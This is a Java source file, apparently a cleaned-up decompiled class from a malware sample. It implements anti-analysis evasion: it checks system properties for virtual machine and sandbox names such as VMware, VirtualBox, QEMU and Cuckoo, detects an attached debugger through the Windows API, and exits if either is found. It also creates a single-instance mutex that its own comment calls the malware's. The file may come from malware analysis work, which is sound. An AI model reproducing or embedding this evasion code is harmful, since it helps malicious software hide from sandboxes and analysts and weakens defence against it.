import com.sun.jna.WString;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.platform.win32.WinDef;
import java.util.List;

/**
 * Cleaned AntiAnalysis (formerly j.java)
 * Detects Virtual Machines, Sandboxes, and Debuggers.
 * Terminates the process if an analysis environment is detected.
 */
public class AntiAnalysis {

    private static final List<String> FORBIDDEN_STRINGS = List.of(
        "VMware", "VirtualBox", "QEMU", "Wine", "SandieBox", "SNDBOX", "Cuckoo"
    );

    /**
     * Runs all anti-analysis checks.
     */
    public static void runChecks() {
        if (isVirtualMachine() || isDebuggerPresent()) {
            System.exit(0);
        }
        
        if (!isSingleInstance()) {
            System.exit(0);
        }
    }

    /**
     * Checks for VM indicators in system properties and environment variables.
     */
    private static boolean isVirtualMachine() {
        String provider = System.getProperty("java.vendor", "").toLowerCase();
        String arch = System.getenv("PROCESSOR_IDENTIFIER") != null ? 
                       System.getenv("PROCESSOR_IDENTIFIER").toLowerCase() : "";
        
        for (String forbidden : FORBIDDEN_STRINGS) {
            String target = forbidden.toLowerCase();
            if (provider.contains(target) || arch.contains(target)) return true;
        }
        return false;
    }

    /**
     * Checks if a debugger is attached using the Windows API.
     */
    private static boolean isDebuggerPresent() {
        return Kernel32.INSTANCE.IsDebuggerPresent();
    }

    /**
     * Ensures only one instance of the malware is running using a Mutex.
     */
    private static boolean isSingleInstance() {
        String mutexName = "Global\\IRA_MALWARE_MUTEX_001";
        WinDef.HANDLE mutex = Kernel32.INSTANCE.CreateMutex(null, true, mutexName);
        if (mutex == null || Kernel32.INSTANCE.GetLastError() == WinBase.ERROR_ALREADY_EXISTS) {
            return false;
        }
        return true;
    }
}
